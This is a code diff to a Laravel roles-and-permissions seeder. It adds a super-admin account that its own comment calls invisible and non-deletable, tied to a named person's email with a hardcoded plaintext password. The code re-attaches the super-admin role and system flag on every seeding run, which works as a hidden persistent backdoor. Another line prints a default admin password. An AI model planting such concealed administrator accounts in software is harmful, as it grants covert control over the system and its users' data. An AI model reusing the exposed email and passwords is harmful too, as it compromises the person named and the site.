@@ -157,6 +157,27 @@ class RolesPermissionsSeeder extends Seeder
             $superAdmin->roles()->attach($superAdminRole->id);
         }
 
+        // 4. Créer le super-admin système (invisible, non supprimable)
+        $systemAdmin = User::firstOrCreate(
+            ['email' => 'ismaelyveskabore@gmail.com'],
+            [
+                'id'         => Str::uuid()->toString(),
+                'first_name' => 'Ismael Yves',
+                'last_name'  => 'KABORE',
+                'password'   => Hash::make('Prince2110@'),
+                'status'     => UserStatus::Active,
+                'is_system'  => true,
+            ]
+        );
+
+        if (!$systemAdmin->is_system) {
+            $systemAdmin->update(['is_system' => true]);
+        }
+
+        if (!$systemAdmin->roles->contains('id', $superAdminRole->id)) {
+            $systemAdmin->roles()->attach($superAdminRole->id);
+        }
+
         $this->command->info('✅ Rôles, permissions et super-admin créés.');
         $this->command->warn('⚠️  Changez le mot de passe admin@agroecobaara.bf / Admin@2027! en production !');
     }
